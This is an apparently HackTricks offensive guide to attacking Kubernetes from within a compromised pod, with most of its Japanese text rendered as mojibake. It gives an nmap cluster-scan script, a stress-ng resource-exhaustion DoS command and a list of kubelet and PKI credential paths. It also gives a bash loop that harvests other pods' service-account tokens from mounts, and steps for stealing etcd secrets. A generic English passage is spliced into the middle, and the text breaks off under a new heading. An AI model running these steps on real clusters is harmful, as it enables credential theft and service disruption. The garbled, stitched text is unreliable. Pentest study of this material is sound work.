# Podå†…ã‹ã‚‰Kubernetesã‚’æ”»æ’ƒã™ã‚‹

<details>

<summary><strong>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’è¦‹ãŸã„**å ´åˆã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«å‚åŠ ã—ã¦ãã ã•ã„ã€‚**

</details>

## **Pod Breakout**

**é‹ãŒè‰¯ã‘ã‚Œã°ã€ãƒãƒ¼ãƒ‰ã‹ã‚‰è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Podã‹ã‚‰ã®è„±å‡º

Podã‹ã‚‰è„±å‡ºã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ãŸã‚ã®ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒã‚ã‚Šã¾ã™ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ä»¥ä¸‹ã®**docker breakouts**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ä¾µå®³ã—ãŸPodã‹ã‚‰è„±å‡ºã—ã‚ˆã†ã¨ã—ã¦ã¿ã¦ãã ã•ã„ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetesç‰¹æ¨©ã®ä¹±ç”¨

**Kubernetesåˆ—æŒ™**ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ã€Podã¯å†…éƒ¨ã«**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æŒã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®Podã«**ç§»å‹•**ã—ãŸã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«**æ‚ªç”¨ã§ãã‚‹ç‰¹æ¨©**ãŒä»˜ä¸ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã®æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ã‚¯ãƒ©ã‚¦ãƒ‰ç‰¹æ¨©ã®ä¹±ç”¨

PodãŒ**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒ**å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ**ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**æ¼æ´©**ã•ã›ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## è„†å¼±ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®æ¤œç´¢

Kubernetesç’°å¢ƒå†…ã«ã„ã‚‹ãŸã‚ã€ç¾åœ¨ã®Podã®ç‰¹æ¨©ã‚’ä¹±ç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ããšã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€**æ½œåœ¨çš„ã«è„†å¼±ãªã‚µãƒ¼ãƒ“ã‚¹ã‚’æ¤œç´¢**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹

**ã“ã®ç›®çš„ã®ãŸã‚ã«ã€Kubernetesç’°å¢ƒã®ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å–å¾—**ã—ã¦ã¿ã¦ãã ã•ã„ï¼š
```
kubectl get svc --all-namespaces
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Kubernetesã¯ãƒ•ãƒ©ãƒƒãƒˆãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã“ã‚Œã¯ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»»æ„ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ãŒä»–ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ã¨é€šä¿¡ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®åå‰ç©ºé–“ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åˆ¶é™ã‚’æŒã£ã¦ã„ã¾ã›ã‚“ã€‚åå‰ç©ºé–“å†…ã®èª°ã§ã‚‚ä»–ã®åå‰ç©ºé–“ã¨é€šä¿¡ã§ãã¾ã™ã€‚

### ã‚¹ã‚­ãƒ£ãƒ³

æ¬¡ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆ[Kubernetesãƒ¯ãƒ¼ã‚¯ã‚·ãƒ§ãƒƒãƒ—](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ã‹ã‚‰å–å¾—ï¼‰ã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ã®IPç¯„å›²ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**Kuberneteså›ºæœ‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»æ’ƒ**ã—ã¦ã€**ä»–ã®ãƒãƒƒãƒ‰/ç’°å¢ƒå…¨ä½“ã‚’ä¾µå®³**ã™ã‚‹æ–¹æ³•ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼š

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**ä¾µå®³ã•ã‚ŒãŸãƒãƒƒãƒ‰ãŒã„ãã¤ã‹ã®æ©Ÿå¯†ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œ**ã—ã¦ãŠã‚Šã€ä»–ã®ãƒãƒƒãƒ‰ãŒèªè¨¼ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€**ãƒ­ãƒ¼ã‚«ãƒ«é€šä¿¡ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ã§ã€ä»–ã®ãƒãƒƒãƒ‰ã‹ã‚‰é€ä¿¡ã•ã‚Œã‚‹è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼ˆãŠã‚ˆã³ãã‚Œã«ã‚ˆã‚‹**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼‰ã®ã‚ˆã†ãªæŠ€è¡“ã¯Kubernetesãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§æ©Ÿèƒ½ã—ã¾ã™ã€‚ãã®ãŸã‚ã€ãƒãƒƒãƒ‰å†…ã§ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**NET\_RAWæ©Ÿèƒ½**ãŒã‚ã‚‹å ´åˆã€ã‚«ã‚¹ã‚¿ãƒ ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã€**åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ãŸMitMæ”»æ’ƒã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€**æ‚ªæ„ã®ã‚ã‚‹ãƒãƒƒãƒ‰**ãŒ**DNSã‚µãƒ¼ãƒãƒ¼ã¨åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œ**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒ**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ãƒãƒ¼ãƒ‰DoS

Kubernetesãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã«ã¯ãƒªã‚½ãƒ¼ã‚¹ã®ä»•æ§˜ãŒãªãã€ã‚³ãƒ³ãƒ†ãƒŠã«ã¯**é©ç”¨ã•ã‚Œã‚‹åˆ¶é™ç¯„å›²ãŒã‚ã‚Šã¾ã›ã‚“**ã€‚æ”»æ’ƒè€…ã¨ã—ã¦ã€**ãƒãƒƒãƒ‰/ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’ã™ã¹ã¦æ¶ˆè²»**ã—ã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¯æ¸‡ã•ã›ã€ç’°å¢ƒã«DoSã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹é–“ã¨ãã®å¾Œã®é•ã„ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ãƒãƒ¼ãƒ‰ã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

ã‚‚ã—ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã«æˆåŠŸã—ãŸå ´åˆã€ãƒãƒ¼ãƒ‰å†…ã§ä»¥ä¸‹ã®èˆˆå‘³æ·±ã„æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™:

* ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆDockerï¼‰
* ã“ã®ã‚³ãƒ³ãƒ†ãƒŠã®ã‚ˆã†ã«ä¹±ç”¨ã§ãã‚‹ã€ãƒãƒ¼ãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ä»–ã®ãƒãƒƒãƒ‰/ã‚³ãƒ³ãƒ†ãƒŠï¼ˆã‚ˆã‚Šå¤šãã®ãƒˆãƒ¼ã‚¯ãƒ³ï¼‰
* ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã¨ä¸€èˆ¬çš„ãªOS
* ãƒªãƒƒã‚¹ãƒ³ã—ã¦ã„ã‚‹Kube-Proxyã‚µãƒ¼ãƒ“ã‚¹
* ãƒªãƒƒã‚¹ãƒ³ã—ã¦ã„ã‚‹Kubeletã‚µãƒ¼ãƒ“ã‚¹ã€‚è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
* ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒª: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* ãã®ä»–ã®Kuberneteså…±é€šãƒ•ã‚¡ã‚¤ãƒ«:
* `$HOME/.kube/config` - ãƒ¦ãƒ¼ã‚¶ãƒ¼è¨­å®š
* `/etc/kubernetes/kubelet.conf`- é€šå¸¸ã®è¨­å®š
* `/etc/kubernetes/bootstrap-kubelet.conf` - ãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—è¨­å®š
* `/etc/kubernetes/manifests/etcd.yaml` - etcdã®è¨­å®š
* `/etc/kubernetes/pki` - Kubernetesã‚­ãƒ¼

### ãƒãƒ¼ãƒ‰ã®kubeconfigã‚’è¦‹ã¤ã‘ã‚‹

å…ˆè¿°ã®ãƒ‘ã‚¹ã®ã„ãšã‚Œã«ã‚‚kubeconfigãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€kubeletãƒ—ãƒ­ã‚»ã‚¹ã®å¼•æ•°`--kubeconfig`ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ç§˜å¯†ã®ç›—ã¿å‡ºã—

To steal secrets from within a pod, you can use various techniques:

1. **Pod-to-Pod Communication**: If the target pod communicates with other pods, you can intercept the network traffic to capture any sensitive information being transmitted.

2. **Pod-to-Service Communication**: Similarly, if the target pod communicates with services within the cluster, you can intercept the network traffic to capture any sensitive information being transmitted.

3. **Pod-to-External Communication**: If the target pod communicates with external resources, such as databases or APIs, you can intercept the network traffic to capture any sensitive information being transmitted.

4. **Pod Logs**: Check the logs of the target pod for any sensitive information that might have been logged, such as credentials or API keys.

5. **Pod Environment Variables**: Inspect the environment variables of the target pod to see if any sensitive information, such as passwords or tokens, is being stored as environment variables.

6. **Pod Mounted Volumes**: If the target pod has mounted volumes, you can explore the contents of these volumes to search for any sensitive files or configuration files that might contain secrets.

Remember to always follow ethical guidelines and obtain proper authorization before attempting any hacking activities.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ã‚¹ã‚¯ãƒªãƒ—ãƒˆ[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)ã¯ã€ä»–ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è‡ªå‹•çš„ã«å–å¾—ã—ã€ãã‚Œã‚‰ãŒæ¢ã—ã¦ã„ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ï¼ˆ1ã¤ãšã¤ç¢ºèªã™ã‚‹ä»£ã‚ã‚Šã«ï¼‰ã€‚
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æ¨©ã®ã‚ã‚‹DaemonSets

DaemonSetã¯ã€**ã‚¯ãƒ©ã‚¹ã‚¿ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹** **ãƒãƒƒãƒ‰**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ç‰¹æ¨©ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§æ§‹æˆã•ã‚ŒãŸDaemonSetã®å ´åˆã€**ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰**ã§ãã®**ç‰¹æ¨©ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒæ‰‹æ³•ã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒã˜ã§ã™ãŒã€ä»Šå›ã¯é‹ã«é ¼ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚

### ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ãƒ”ãƒœãƒƒãƒˆ

ã‚¯ãƒ©ã‚¹ã‚¿ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã€**ãƒãƒ¼ãƒ‰ã¯ãƒãƒƒãƒ‰ã¨ã¯ç•°ãªã‚‹ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã§ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã¾ã™ã€‚ãã®ãŸã‚ã€ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ï¼ˆã¾ãŸã¯hostNetworkãŒTrueã®ãƒãƒƒãƒ‰ã‹ã‚‰ï¼‰ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcdã®ç›—ã¿å‡ºã—

ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹ãƒãƒ¼ãƒ‰ã®[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ã‚’æŒ‡å®šã§ãã‚‹å ´åˆã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰å†…ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã‚’å–å¾—ã—ã¾ã™ã€‚
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã¯**ãƒã‚¹ã‚¿ãƒ¼ã®å½¹å‰²**ã‚’æŒã¡ã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç®¡ç†ã‚¯ãƒ©ã‚¹ã‚¿ã§ã¯ãã‚Œã‚‰ã«ä½•ã‚‚å®Ÿè¡Œã§ãã¾ã›ã‚“**ã€‚

#### etcdã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹

ãƒãƒƒãƒ‰ã®ä»•æ§˜ã§`nodeName`ã‚»ãƒ¬ã‚¯ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ä¸Šã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿ã®ã™ã¹ã¦ã®è¨­å®šã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å«ã‚€`etcd`ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç°¡å˜ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ä»¥ä¸‹ã¯ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ä¸Šã§`etcd`ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã€`etcd`ã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ã‚¯ã‚¤ãƒƒã‚¯ã§æ±šã„æ–¹æ³•ã§ã™ã€‚ã‚‚ã—ã€ã‚ˆã‚Šã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆãªè§£æ±ºç­–ã‚’æœ›ã‚€å ´åˆã¯ã€`etcdctl`ã¨ã„ã†`etcd`ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã®èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œä¸­ã®etcdã«æ¥ç¶šã™ã‚‹ã€[ã“ã®ä¾‹ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆ](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼ˆ@mauilionã‹ã‚‰ï¼‰ã€‚

**ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§`etcd`ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼ˆã“ã‚Œã¯`kubeadm`ã§ä½œæˆã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã‚¿ã®å ´åˆã§ã™ï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Kuberneteså†…ã®ãƒãƒƒãƒ‰ã‹ã‚‰ã®æ”»æ’ƒ

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒãƒƒãƒ‰ã‹ã‚‰ã®æ”»æ’ƒã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã®æ”»æ’ƒã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## 1. ãƒãƒƒãƒ‰å†…ã®æƒ…å ±åé›†

